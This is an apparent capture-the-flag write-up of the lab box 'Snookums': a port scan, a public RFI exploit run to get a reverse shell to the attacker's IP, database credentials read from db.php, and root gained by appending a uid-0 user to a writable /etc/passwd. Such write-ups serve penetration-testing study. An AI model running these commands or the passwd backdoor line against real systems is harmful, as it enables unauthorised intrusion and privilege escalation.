---
title: "PG Practice - Snookums"
date: 2026-04-11
draft: false
tags: ["Proving Grounds Practice", "Linux", "Write-Up"]
cover:
    image: "/images/writeup_screens/pg_payday/pg_payday_cover.svg"      
    alt: "Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| Difficulty | Intermediate |
| Type | Linux |

**Port Scan**
```
└─$ nmap -sV 192.168.224.58
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 19:31 +0200
Nmap scan report for 192.168.224.58
Host is up (0.034s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp open  mysql       MySQL (unauthorized)
Service Info: Host: SNOOKUMS; OS: Unix
```

## Local

The webserver on port **80** hosts a **simple PHP Photo Gallery** with **v0.8** as we can see in the frontend. I searched the web for vulnerabilities affecting this version and I found a [public exploit](https://github.com/beauknowstech/SimplePHPGal-RCE.py) that targets a **RFI** vulnerability which I tried after starting a **netcat** listener in another terminal window on port **21** (always use ports that are open on the target to prevent firewall issues): 

```
$ python3 SimplePHPGal-RCE.py http://$IP/ 192.168.45.226 21
```

Shortly after, I received a reverse shell in my listener as user **apache**. 

The first thing I did in the shell I received was to use `python -c 'import pty; pty.spawn("/bin/bash")'` to get a TTY shell. Next, i checked the current folder for its contents and decided to look at the _db.php_ file in which we can find root credentials for the database: 

![](/images/writeup_screens/pg_snook/pg_snook1.png)

```
user: root
password: MalapropDoffUtilize1337
```

I then used these credentials to login in to the **mysql** database which is running as we have seen in the port scan results:

```
$ mysql -u root -p
```

Subsequently I used the following **mysql** commands to enumerate the databases and finally look at the contents of the **users** table:

```
mysql> SHOW DATABASES;
mysql> USE SimplePHPGal;
mysql> SHOW TABLES;
mysql> SELECT * FROM users
```

![](/images/writeup_screens/pg_snook/pg_snook2.png)

The passwords seem to be **Base64** encoded and decided to decode the password of **michael** (user exists on the system as we can see in _/etc/passwd_ as well as in _/home_) which resulted in the following: 

```
HockSydneyCertify123
```

I used the obtained password to login as **michael** with `$ su michael`. This was successful and i could read the flag at _/home/michael/local.txt_.


---

## Proof

After enumerating the system for a while, i found that there is a misconfiguration of the _/etc/passwd_ permissions because **michael** is the owner of the file: 

![](/images/writeup_screens/pg_snook/pg_snook3.png)

This poses a major issue since this means we have write-permissions on the file and can add a new root user to the system. To do so, we first need to create a **Linux password hash**: 

```
$ openssl passwd password
```

We use the resulting hash for our new **root2** user which we can create with the following command:

```
echo 'root2:$1$4EVDzmA5$/1v.BVRkXcVwAUzP6AK5t/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Finally, we can login as the user with ``$ su root2`` and read the flag at _/root/proof.txt_.
